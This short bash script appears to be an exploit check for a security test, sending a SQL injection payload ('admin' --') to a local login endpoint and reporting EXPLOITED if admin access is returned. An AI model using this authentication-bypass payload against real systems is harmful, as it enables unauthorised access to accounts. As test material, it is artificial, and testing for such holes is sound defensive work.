#!/usr/bin/env bash
BASE="http://127.0.0.1:${PORT:-8000}"
resp=$(curl -s "$BASE/login?username=admin%27%20--&password=anything")
if echo "$resp" | grep -q '"role":"admin"'; then echo "EXPLOITED"; exit 0
else echo "NOT_EXPLOITED"; exit 1; fi
